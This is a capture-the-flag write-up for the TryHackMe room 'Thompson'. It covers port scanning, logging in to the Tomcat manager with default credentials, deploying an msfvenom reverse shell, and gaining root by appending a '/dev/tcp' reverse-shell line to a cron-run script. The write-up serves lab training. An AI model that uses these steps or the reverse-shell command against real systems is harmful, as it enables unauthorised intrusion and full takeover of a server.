# Writeup for Room "Thompson"

This is the writeup for the box Thompson

## 🔍 Enumeration Phase

## 1. WebSite
- There is not a website
- There is not a `robots.txt`.

    ![WebSite](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/thompson/screenshots/00.png)

## 2. Fuzzing
-  **Dirbuster / Gobuster** have been excluded from the scan.
  
## 📡 3. Nmap Scan
- The following information was found:
  - The port 22 is open. **SSH**
  - The port 8009 is open. **Apache Jserv**
  - The port 8080 is open. **HTTP (Apache Tomcat)**

    ![Nmap Scan](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/thompson/screenshots/01.png)

## 4. Tomcat Manager
- When I loaded the route ```http://ip-machine:8080/manager``` I got the popup window
  
  ![tomcat-manager](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/thompson/screenshots/02.png)

- There is a username and password for default, I tried to login with these credentials and I have gotten to enter:
  
  ![tomcat-manager-2](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/thompson/screenshots/03.png)
  
  ![tomcat-manager-3](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/thompson/screenshots/04.png)

## 5. Reverse Shell
- I am going to try a reverse shell with the ```revshells.com``` website as we can see in the screenshot below:
  
  ![revshells.com](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/thompson/screenshots/05.png)

- I am going to compile the following code with ```msfvenom``` and I will use the ```nc``` command to connect to the machine:
  
  ![msfvenom](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/thompson/screenshots/06.png)
  
  ![nc](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/thompson/screenshots/07.png)

- After uploading the file and do a deploy, the ```nc``` has a shell:
  
  ![file-uploaded](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/thompson/screenshots/08.png)
  
  ![shell](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/thompson/screenshots/09.png)

- If I navigate to Jack’s user folder, I find the first flag:
  
  ![jack-user](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/thompson/screenshots/10.png)

## 🐚💻🚀 6. Privilege Escalation
- In the same directory, there is a file named ```id.sh```, which is a script that adds the id user to the test.txt file.
  
  ![id.sh](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/thompson/screenshots/11.png)

- I executed a ```cat /etc/crontab``` and I found the following line:
  
  ![crontab](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/thompson/screenshots/12.png)

> [!NOTE]
> The id.sh script is executed every minute.

- I have added the following line to the script file : ```/bin/bash -c "bash -i >& /dev/tcp/YOUR-IP-MACHINE/5555 0>&1"```
  
  ![id-sh-2](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/thompson/screenshots/13.png)

- I opened a ```nc -nvlp 5555```, and one minute later I had root access, where I found the second flag: 
  
  ![root-access](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/thompson/screenshots/14.png)